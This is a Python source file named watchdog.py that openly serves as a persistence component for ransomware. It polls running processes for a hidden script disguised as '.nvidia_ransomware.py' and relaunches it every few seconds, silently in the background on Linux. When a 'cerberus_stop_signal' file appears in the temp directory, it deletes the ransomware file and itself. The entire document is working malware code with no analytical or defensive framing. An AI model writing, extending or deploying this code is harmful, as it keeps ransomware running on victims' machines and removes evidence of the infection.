# watchdog.py - Auto-restart monitor for ransomware
import os
import sys
import time
import subprocess
import tempfile
import psutil

# Configuration
RANSOMWARE_SCRIPT = ".nvidia_ransomware.py"  # Filename only, will be in same dir as watchdog
CHECK_INTERVAL = 5  # Check every 5 seconds
STOP_SIGNAL_FILE = os.path.join(tempfile.gettempdir(), "cerberus_stop_signal")

def is_ransomware_running():
    """Check if ransomware process is running."""
    try:
        for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
            try:
                cmdline = proc.info.get('cmdline')
                if cmdline and any(RANSOMWARE_SCRIPT in str(arg) for arg in cmdline):
                    return True
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        return False
    except Exception:
        return False

def start_ransomware():
    """Start the ransomware process with visible GUI."""
    try:
        watchdog_dir = os.path.dirname(os.path.abspath(__file__))
        ransomware_path = os.path.join(watchdog_dir, RANSOMWARE_SCRIPT)
        
        if not os.path.exists(ransomware_path):
            return False
            
        if os.name == 'nt':
            # Windows: Run with visible GUI (no hidden flags!)
            subprocess.Popen([sys.executable, ransomware_path])
        else:
            # Linux: Run in background
            subprocess.Popen([sys.executable, ransomware_path],
                           stdout=subprocess.DEVNULL,
                           stderr=subprocess.DEVNULL)
        return True
    except Exception:
        return False

def should_stop():
    """Check if stop signal exists."""
    return os.path.exists(STOP_SIGNAL_FILE)

def cleanup_and_exit():
    """Delete watchdog, ransomware files, and the stop signal."""
    try:
        watchdog_dir = os.path.dirname(os.path.abspath(__file__))
        ransomware_path = os.path.join(watchdog_dir, RANSOMWARE_SCRIPT)
        watchdog_path = os.path.abspath(__file__)
        
        # Remove stop signal
        if os.path.exists(STOP_SIGNAL_FILE):
            try: os.remove(STOP_SIGNAL_FILE)
            except: pass
        
        # Delete ransomware file
        if os.path.exists(ransomware_path):
            try: os.remove(ransomware_path)
            except: pass
        
        # Delete watchdog file (self-delete)
        if os.path.exists(watchdog_path):
            try: os.remove(watchdog_path)
            except: pass
    except:
        pass

def main():
    """Main watchdog loop with proper signal checking."""
    
    # STEP 1: Check for leftover stop signal (from previous run)
    if should_stop():
        cleanup_and_exit()
        return
    
    # STEP 2: Start ransomware if not running
    if not is_ransomware_running():
        start_ransomware()
        time.sleep(3)  # Give it time to start
    
    # STEP 3: Monitor loop
    while True:
        try:
            # ALWAYS check stop signal FIRST before ANY action
            if should_stop():
                cleanup_and_exit()
                break
            
            # Only restart if not running AND no stop signal
            if not is_ransomware_running():
                # Double-check stop signal before restarting (fixes timing loophole)
                if should_stop():
                    cleanup_and_exit()
                    break
                    
                start_ransomware()
                time.sleep(2)  # Wait before next check
            
            time.sleep(CHECK_INTERVAL)
            
        except KeyboardInterrupt:
            break
        except Exception:
            time.sleep(CHECK_INTERVAL)

if __name__ == "__main__":
    main()
